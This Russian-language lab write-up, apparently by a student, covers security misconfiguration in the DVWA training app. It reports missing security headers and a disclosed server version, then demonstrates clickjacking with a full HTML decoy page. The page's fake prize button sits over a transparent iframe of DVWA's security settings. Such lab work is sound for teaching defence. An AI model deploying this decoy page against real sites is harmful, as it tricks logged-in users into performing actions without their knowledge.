# Неправильная конфигурация (Security Misconfiguration)

### Цель работы

Выявить ошибки конфигурации веб-сервера и приложения, которые могут привести к раскрытию служебной информации или созданию дополнительных векторов атак.

## Ход выполнения

### 1) Разведка

Для анализа конфигурации веб-сервера был перехвачен HTTP-ответ от DVWA при обычном запросе к главной странице:

<img width="328" height="214" alt="изображение" src="https://github.com/user-attachments/assets/5261f682-cd13-49d0-9396-1fe2c4b61b15" />

| Заголовок | Значение | Проблема |
|-----------|----------|----------|
| `Server` | Apache/2.4.25 (Debian) | Раскрыта точная версия веб-сервера |
| `X-Frame-Options` | отсутствует | Возможность встраивания страницы в iframe |
| `Content-Security-Policy` | отсутствует | Нет защиты от XSS и встраивания ресурсов |
| `Strict-Transport-Security` | отсутствует | Нет принудительного HTTPS |

Сервер раскрывает версию программного обеспечения: `Apache/2.4.25 (Debian)`. Это также позволяет искать известные уязвимости для данной версии.

### 2) Атака

Отсутствие заголовка `X-Frame-Options` делает приложение уязвимым к атаке встраивания страницы. Для демонстрации был создан HTML-файл `noVirus.html`, который загружает страницу управления уровнем безопасности DVWA (`security.php`) внутри прозрачного **iframe**. Поверх **iframe** размещена кнопка-приманка.

```html
<!DOCTYPE html>
<html>
<head>
  <title>Выиграйте приз!</title>
  <style>
    body {
      text-align: center;
      font-family: Arial;
    }
    .prize-button {
      position: absolute;
      top: 420px;
      left: 45%;
      padding: 12px 30px;
      background-color: #ff6600;
      color: white;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      z-index: 1;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.1;
      z-index: 2;
    }
  </style>
</head>
<body>
  <h2>Поздравляем! Вы выбраны!</h2>
  <p>Нажмите кнопку, чтобы получить эксклюзивный бонус:</p>
  <button class="prize-button">Забрать бонус</button>
  <iframe src="http://localhost:8081/security.php"></iframe>
</body>
</html>
```

### 3) Эксплуатация

Созданная страница `noVirus.html` была открыта в браузере, где пользователь уже авторизован в DVWA. Пользователь видит интерфейс DVWA, поверх которого расположена кнопка **«Забрать бонус»**. При нажатии на эту кнопку пользователь фактически взаимодействует с элементами DVWA, расположенными под курсором.

Поскольку сессия пользователя активна, все действия выполняются от его имени. Можно расположить кнопку над любым критическим элементом интерфейса - например, над кнопкой изменения уровня безопасности или удаления пользователя.

<img width="1096" height="734" alt="изображение" src="https://github.com/user-attachments/assets/ef800058-18de-4d76-9dd7-82f2149e8a76" />

В данном случае при нажатии на кнопку «Забрать бонус» пользователь не подозревает, что фактически изменяет уровень безопасности DVWA с `high` на `low`, что открывает возможности для дальнейших атак.

## Выводы о защищенности

В ходе работы установлено, что веб-приложение уязвимо к атаке типа Clickjacking. Причиной является отсутствие защитных HTTP-заголовков. Отсутствие механизмов позволяет встраивать страницы приложения во внешние ресурсы и выполнять действия от имени пользователя без его ведома.

Данная уязвимость классифицируется как:
- **CWE-1021: Improper Restriction of Rendered UI Layers or Frames** - отсутствие ограничений на встраивание страниц в **iframe**
- **CWE-200: Exposure of Sensitive Information** - раскрытие версии сервера
